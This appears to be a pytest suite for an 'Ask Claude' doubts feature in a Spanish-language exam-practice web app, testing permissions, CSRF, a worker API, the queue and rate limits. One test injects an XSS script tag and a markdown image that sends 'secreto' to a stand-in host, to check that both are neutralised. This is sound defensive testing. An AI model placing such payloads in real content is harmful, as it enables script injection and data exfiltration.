"""«Preguntar a Claude»: panel en los tests, «Mis dudas» y API interna del trabajador."""
import re
from datetime import timedelta

import pytest
from conftest import crear_usuario, entrar, post, token

from app.config import ConfiguracionError, Settings
from app.models import Consulta, ConsultaMensaje, Intento, ahora

TOKEN = "t" * 40
BEARER = {"Authorization": f"Bearer {TOKEN}"}
HX = {"HX-Request": "true"}
BASE = "/c/aif-c01"


@pytest.fixture
def app_c(curso, tmp_path):
    from app.main import create_app

    s = Settings(secret_key="k" * 40, database_url=f"sqlite:///{tmp_path}/c.db", courses_dir=curso / "cursos",
                 schemas_dir=curso / "schemas", login_max_intentos=3, consultas_token=TOKEN)
    return create_app(s)


def admin(app):
    crear_usuario(app, "root", rol="admin")
    return entrar(app, "root")


def iniciar(c, **datos):
    r = post(c, f"{BASE}/tests/iniciar", f"{BASE}/tests", **datos)
    assert r.status_code == 303
    return int(re.search(r"/tests/(\d+)", r.headers["location"]).group(1))


def n_de(app, iid, pid):
    with app.state.sesiones() as db:
        return db.get(Intento, iid).preguntas.index(pid) + 1


def enviar(c, pid="D3-001", texto="¿Por qué no es fine-tuning?", intento=None, htmx=True):
    datos = {"texto": texto, "csrf": token(c, f"{BASE}/dudas")}
    if intento:
        datos["intento"] = str(intento)
    return c.post(f"{BASE}/consultas/{pid}", data=datos, headers=HX if htmx else {}, follow_redirects=False)


def api(c, ruta, cabeceras=BEARER, **json):
    return c.post(f"/api/consultas{ruta}", json=json or None, headers=cabeceras)


# ---------------------------------------------------------------- activación y permisos

def test_desactivado_por_defecto(app):
    c = admin(app)
    iid = iniciar(c, modo="mixto", n="4")
    html = c.get(f"{BASE}/tests/{iid}/p/1").text
    assert "/consultas/" not in html and "Mis dudas" not in html
    assert c.get(f"{BASE}/dudas").status_code == 404
    assert c.get(f"{BASE}/consultas/D3-001/panel").status_code == 404
    assert c.post("/api/consultas/siguiente", headers=BEARER).status_code == 404


def test_token_corto_no_arranca():
    with pytest.raises(ConfiguracionError):
        Settings.desde_entorno({"SECRET_KEY": "k" * 40, "CONSULTAS_TOKEN": "corto"})
    s = Settings.desde_entorno({"SECRET_KEY": "k" * 40, "CONSULTAS_TOKEN": "  "})
    assert s.consultas_token is None
    assert Settings.desde_entorno({"SECRET_KEY": "k" * 40, "CONSULTAS_TOKEN": TOKEN}).consultas_token == TOKEN


def test_estudiante_no_ve_el_panel_y_recibe_403(app_c):
    crear_usuario(app_c)
    c = entrar(app_c)
    iid = iniciar(c, modo="mixto", n="4")
    html = c.get(f"{BASE}/tests/{iid}/p/1").text
    assert "/consultas/" not in html and "Mis dudas" not in html
    assert c.get(f"{BASE}/dudas").status_code == 403
    assert c.get(f"{BASE}/consultas/D3-001/panel").status_code == 403
    r = post(c, f"{BASE}/consultas/D3-001", f"{BASE}/tests", texto="hola")
    assert r.status_code == 403
    with app_c.state.sesiones() as db:
        assert db.query(Consulta).count() == 0


def test_admin_ve_el_panel_antes_de_responder_y_en_el_simulacro(app_c):
    c = admin(app_c)
    iid = iniciar(c, modo="mixto", n="4")
    pid = c.get(f"{BASE}/tests/{iid}/p/1")
    assert "Mis dudas" in pid.text and '/consultas/' in pid.text and f"panel?intento={iid}" in pid.text
    sim = iniciar(c, modo="simulacro")
    assert f"panel?intento={sim}" in c.get(f"{BASE}/tests/{sim}/p/1").text
    panel = c.get(f"{BASE}/consultas/D3-001/panel?intento={iid}").text
    assert "Preguntar a Claude" in panel and "prevalece la documentación oficial de AWS" in panel
    assert "every 5s" not in panel and "<html" not in panel
    assert f'name="intento" value="{iid}"' in panel
    assert c.get(f"{BASE}/consultas/NO-EXISTE/panel").status_code == 404


def test_panel_en_el_resultado(app_c):
    c = admin(app_c)
    iid = iniciar(c, modo="mixto", n="4")
    post(c, f"{BASE}/tests/{iid}/finalizar")
    html = c.get(f"{BASE}/tests/{iid}/resultado").text
    assert html.count("consulta-plegable") == 4 and "toggle once from:closest details" in html


def test_intento_ajeno_se_ignora(app_c):
    crear_usuario(app_c)
    ana = entrar(app_c)
    ajeno = iniciar(ana, modo="mixto", n="4")
    c = admin(app_c)
    panel = c.get(f"{BASE}/consultas/D3-001/panel?intento={ajeno}").text
    assert 'name="intento"' not in panel


# ---------------------------------------------------------------- envío

def test_csrf_obligatorio(app_c):
    c = admin(app_c)
    r = c.post(f"{BASE}/consultas/D3-001", data={"texto": "hola"}, follow_redirects=False)
    assert r.status_code == 303
    with app_c.state.sesiones() as db:
        assert db.query(ConsultaMensaje).count() == 0


def test_duda_pendiente_una_conversacion_y_un_pendiente(app_c):
    c = admin(app_c)
    iid = iniciar(c, modo="mixto", n="4")
    r = enviar(c, intento=iid)
    assert r.status_code == 200
    assert "En cola" in r.text and "every 5s" in r.text and "¿Por qué no es fine-tuning?" in r.text
    assert f"/consultas/D3-001/mensajes?intento={iid}" in r.text
    r = enviar(c, texto="Otra", intento=iid)
    assert "Ya hay una duda en curso" in r.text
    with app_c.state.sesiones() as db:
        assert db.query(Consulta).count() == 1
        k = db.query(Consulta).one()
        assert k.intento_id == iid and [m.estado for m in k.mensajes] == ["pendiente"]
    assert "Escribe tu duda" in enviar(c, texto="   ").text
    assert "demasiado larga" in enviar(c, pid="D3-002", texto="x" * 2001).text


def test_envio_sin_htmx_vuelve_a_la_pregunta(app_c):
    c = admin(app_c)
    iid = iniciar(c, modo="mixto", n="4")
    n = n_de(app_c, iid, "D3-002")
    r = enviar(c, pid="D3-002", intento=iid, htmx=False)
    assert r.status_code == 303 and r.headers["location"] == f"{BASE}/tests/{iid}/p/{n}"
    r = enviar(c, pid="D3-003", htmx=False)
    assert r.status_code == 303 and re.fullmatch(rf"{BASE}/dudas/\d+", r.headers["location"])


# ---------------------------------------------------------------- API interna

def test_api_exige_el_token(app_c):
    c = admin(app_c)
    enviar(c)
    for cab in ({}, {"Authorization": "Bearer " + "x" * 40}, {"Authorization": TOKEN}, {"Authorization": "Basic " + TOKEN}):
        assert api(c, "/siguiente", cab).status_code == 404
        assert api(c, "/mensajes/1/respuesta", cab, texto="x").status_code == 404
    with app_c.state.sesiones() as db:
        assert db.query(ConsultaMensaje).one().estado == "pendiente"


def test_api_sin_cookie_ni_csrf(app_c):
    from fastapi.testclient import TestClient

    c = admin(app_c)
    enviar(c)
    anonimo = TestClient(app_c)
    assert anonimo.post("/api/consultas/siguiente", headers=BEARER).status_code == 200


def test_ciclo_siguiente_respuesta_y_conversacion(app_c):
    c = admin(app_c)
    assert api(c, "/siguiente").status_code == 204
    iid = iniciar(c, modo="mixto", n="4")
    enviar(c, intento=iid)
    r = api(c, "/siguiente")
    assert r.status_code == 200
    d = r.json()
    assert d["texto"] == "¿Por qué no es fine-tuning?" and d["curso"] == "aif-c01" and d["sesion_claude"] is None
    assert d["respondida"] is False and d["respuesta_usuario"] is None and d["intentos"] == 1
    p = d["pregunta"]
    assert p["id"] == "D3-001" and p["correctas"] == ["b"] and p["banco"] == "examen"
    assert p["teoria_fichero"] == "modulos/03-modelos-fundacionales/README.md"
    assert api(c, "/siguiente").status_code == 204  # ya está «procesando»
    panel = c.get(f"{BASE}/consultas/D3-001/panel").text
    assert "Pensando…" in panel and "every 5s" in panel
    texto = ("Porque **RAG** basta. <script>alert(1)</script> [Docs](https://docs.aws.amazon.com/bedrock/)"
             " ![espía](https://malo.example/x.png?d=secreto)")
    assert d["reparto"] == 1
    assert api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto=texto, sesion_claude="ses-1", reparto=1).status_code == 200
    m = c.get(f"{BASE}/consultas/D3-001/mensajes").text
    assert "<strong>RAG</strong>" in m and "<script>" not in m and "&lt;script&gt;" in m
    assert "<img" not in m and 'href="https://malo.example/x.png?d=secreto"' in m  # la imagen queda como enlace
    assert "img-src 'self' data:" in c.get(f"{BASE}/dudas").headers["content-security-policy"]
    assert 'target="_blank"' in m and 'rel="noopener noreferrer"' in m and "every 5s" not in m
    # segunda duda en la misma conversación: el trabajador recibe la sesión para --resume
    enviar(c, texto="¿Y si cambian a diario?")
    d2 = api(c, "/siguiente").json()
    assert d2["consulta_id"] == d["consulta_id"] and d2["sesion_claude"] == "ses-1"
    assert api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto="otra", reparto=1).status_code == 409


def test_respondida_y_respuesta_del_usuario(app_c):
    c = admin(app_c)
    iid = iniciar(c, modo="mixto", n="4")
    n = n_de(app_c, iid, "D3-001")
    post(c, f"{BASE}/tests/{iid}/responder", f"{BASE}/tests/{iid}/p/{n}", n=n, r="a")
    enviar(c, intento=iid)
    d = api(c, "/siguiente").json()
    assert d["respondida"] is True and d["respuesta_usuario"] == ["a"]


def test_reintentar_error_y_reintentar_desde_el_panel(app_c):
    c = admin(app_c)
    enviar(c)
    mid = api(c, "/siguiente").json()["mensaje_id"]
    assert api(c, f"/mensajes/{mid}/reintentar", motivo="usage limit", contar=False, reparto=1).status_code == 200
    d = api(c, "/siguiente").json()
    assert d["mensaje_id"] == mid and d["intentos"] == 1 and d["reparto"] == 2  # la cuota no gasta intentos
    assert api(c, f"/mensajes/{mid}/reintentar", motivo="timeout", reparto=2).status_code == 200
    d = api(c, "/siguiente").json()
    assert d["intentos"] == 2 and d["reparto"] == 3
    assert api(c, f"/mensajes/{mid}/error", motivo="Fallo de Claude", reparto=3).status_code == 200
    panel = c.get(f"{BASE}/consultas/D3-001/panel").text
    assert "Error: Fallo de Claude" in panel and "Reintentar" in panel and "every 5s" not in panel
    r = c.post(f"{BASE}/consultas/D3-001/reintentar", data={"csrf": token(c, f"{BASE}/dudas")}, headers=HX)
    assert r.status_code == 200 and "En cola" in r.text and "every 5s" in r.text
    with app_c.state.sesiones() as db:
        m = db.get(ConsultaMensaje, mid)
        assert (m.estado, m.intentos, m.error) == ("pendiente", 0, None)


def test_recupera_procesando_caducado(app_c):
    c = admin(app_c)
    enviar(c)
    mid = api(c, "/siguiente").json()["mensaje_id"]
    assert api(c, "/siguiente").status_code == 204
    with app_c.state.sesiones() as db:
        db.get(ConsultaMensaje, mid).actualizado = ahora() - timedelta(minutes=16)
        db.commit()
    d = api(c, "/siguiente").json()
    assert d["mensaje_id"] == mid and d["intentos"] == 2


def test_pregunta_retirada_pasa_a_error(app_c):
    c = admin(app_c)
    enviar(c)
    with app_c.state.sesiones() as db:
        db.query(Consulta).one().pregunta_id = "D9-999"
        db.commit()
    assert api(c, "/siguiente").status_code == 204
    with app_c.state.sesiones() as db:
        assert db.query(ConsultaMensaje).one().estado == "error"


# ---------------------------------------------------------------- «Mis dudas»

def test_mis_dudas_y_conversacion(app_c):
    c = admin(app_c)
    assert "Todavía no has preguntado nada" in c.get(f"{BASE}/dudas").text
    enviar(c)
    enviar(c, pid="D3-002", texto="¿Qué es few-shot?")
    d = api(c, "/siguiente").json()
    api(c, f"/mensajes/{d['mensaje_id']}/respuesta", texto="Respuesta de *prueba*", sesion_claude="s", reparto=d["reparto"])
    html = c.get(f"{BASE}/dudas").text
    assert "D3-001" in html and "D3-002" in html and "Respondida" in html and "En cola" in html
    with app_c.state.sesiones() as db:
        cid = db.query(Consulta).filter_by(pregunta_id="D3-001").one().id
    html = c.get(f"{BASE}/dudas/{cid}").text
    assert "Duda sobre D3-001" in html and "<em>prueba</em>" in html and "Solución:" in html and "Preguntar a Claude" in html
    # otro admin no ve conversaciones ajenas
    crear_usuario(app_c, "otro", rol="admin")
    assert entrar(app_c, "otro").get(f"{BASE}/dudas/{cid}").status_code == 404


# ---------------------------------------------------------------- revisión de seguridad

def test_api_rechaza_peticiones_por_el_proxy(app_c):
    c = admin(app_c)
    enviar(c)
    assert api(c, "/siguiente", {**BEARER, "X-Forwarded-For": "192.168.1.50"}).status_code == 404
    assert api(c, "/siguiente", {**BEARER, "Forwarded": "for=192.168.1.50"}).status_code == 404
    assert api(c, "/siguiente").status_code == 200


def test_solo_el_reparto_en_curso(app_c):
    c = admin(app_c)
    enviar(c)
    d = api(c, "/siguiente").json()
    mid = d["mensaje_id"]
    for ruta, extra in (("respuesta", {"texto": "x"}), ("reintentar", {}), ("error", {})):
        assert api(c, f"/mensajes/{mid}/{ruta}", reparto=d["reparto"] + 1, **extra).status_code == 409
        assert api(c, f"/mensajes/{mid}/{ruta}", **extra).status_code == 409  # sin reparto
    # el «procesando» caduca y se reparte otra vez: el reparto antiguo ya no puede responder
    with app_c.state.sesiones() as db:
        db.get(ConsultaMensaje, mid).actualizado = ahora() - timedelta(minutes=16)
        db.commit()
    d2 = api(c, "/siguiente").json()
    assert d2["reparto"] == d["reparto"] + 1
    assert api(c, f"/mensajes/{mid}/respuesta", texto="tarde", reparto=d["reparto"]).status_code == 409
    assert api(c, f"/mensajes/{mid}/reintentar", reparto=d2["reparto"]).status_code == 200
    # un mensaje pendiente (no «procesando») tampoco se puede responder
    assert api(c, f"/mensajes/{mid}/respuesta", texto="x", reparto=d2["reparto"]).status_code == 409


def test_reparto_atomico(app_c):
    """Si entre la lectura y el UPDATE otro reparto se queda la duda, este no la entrega dos veces."""
    from sqlalchemy import event, text

    c = admin(app_c)
    enviar(c)
    motor = app_c.state.motor
    hecho = []

    def antes(conn, cursor, sql, params, context, executemany):
        if sql.lstrip().upper().startswith("UPDATE CONSULTA_MENSAJE") and not hecho:
            hecho.append(1)
            with motor.connect() as otra:  # «otro trabajador» toma la duda justo antes
                otra.execute(text("UPDATE consulta_mensaje SET estado='procesando', actualizado=:a"), {"a": ahora().strftime("%Y-%m-%d %H:%M:%S.%f")})
                otra.commit()

    event.listen(motor, "before_cursor_execute", antes)
    try:
        assert api(c, "/siguiente").status_code == 204
    finally:
        event.remove(motor, "before_cursor_execute", antes)
    with app_c.state.sesiones() as db:
        m = db.query(ConsultaMensaje).one()
        assert m.estado == "procesando" and m.repartos == 0


def test_tope_de_dudas_en_espera_y_por_dia(app_c):
    c = admin(app_c)
    for pid in ("D3-001", "D3-002", "D3-003"):
        assert "En cola" in enviar(c, pid=pid).text
    r = enviar(c, pid="D3-004")
    assert "Ya tienes 3 dudas esperando respuesta" in r.text
    with app_c.state.sesiones() as db:
        assert db.query(ConsultaMensaje).count() == 3
        # 27 dudas más ya respondidas en las últimas 24 h (30 en total)
        k = db.query(Consulta).first()
        for _ in range(27):
            k.mensajes.append(ConsultaMensaje(rol="usuario", texto="x", estado="respondido"))
        for m in db.query(ConsultaMensaje).filter_by(estado="pendiente"):
            m.estado = "respondido"
        db.commit()
    assert "máximo de 30 dudas en 24 horas" in enviar(c, pid="D3-004").text
    with app_c.state.sesiones() as db:
        for m in db.query(ConsultaMensaje):
            m.creado = ahora() - timedelta(hours=25)
        db.commit()
    assert "En cola" in enviar(c, pid="D3-004").text
